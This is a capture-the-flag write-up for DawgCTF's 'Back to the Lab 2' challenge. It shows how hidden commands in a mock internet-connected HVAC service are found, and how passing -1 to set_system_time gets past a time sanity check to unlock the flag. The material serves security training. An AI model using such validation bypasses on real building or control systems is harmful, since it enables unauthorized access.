# Back to the Lab 2
```
We installed this new HVAC system in the lab using NI instrumentation. Ooh, it's internet-connected. Can you get the flag off of it? It requires "company technician access" but we managed to convince the company to give us some old source code, maybe you can find a workaround?

nc umbcsad.crabdance.com 8000

back\_to\_the\_lab\_2.vi: [https://drive.google.com/file/d/1Bu7xpMiGCEPONd7Hdl6BQL6JXqrFWE6i/view?usp=sharing](https://drive.google.com/file/d/1Bu7xpMiGCEPONd7Hdl6BQL6JXqrFWE6i/view?usp=sharing)

Author: nb
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc umbcsad.crabdance.com 8000
Welcome. Type ? for help.
DAWG> ?
You have logged in to the Cyberdawgs Lab Air Conditioning System.
Commands:
- help: Show help
- temperature: Get the temperature in the lab
- quit: Exit the system
Other commands have been removed from the help menu due to security concerns. Please contact the HVAC department.
```

Functions were found from the provided `back_to_the_lab2.vi`, such as `get_flag`,  `set_system_time`, and `get_system_time`. The application was designed to not function past the year 2030. 

Testing `set_system_time` found that the there was as sanity check for increasing the date.
```bash
DAWG> set_system_time 999999999999999999999999999
Error!
Sanity checked incoming time against system clock... Time change not permitted! You can't adjust the system time further out than one year!
(Reload the Mr. Fusion module before retrying.)
```

Setting the system time to `-1` causes the year to be set to 2040.
```bash
DAWG> set_system_time -1
Done. New system time is: "01:28 AM Mon, Feb 06, 2040"
```

Can then run `get_flag` to retrieve flag
```bash
 get_flag
DawgCTF{t1m3_b3ck0n1ng_m3}
```
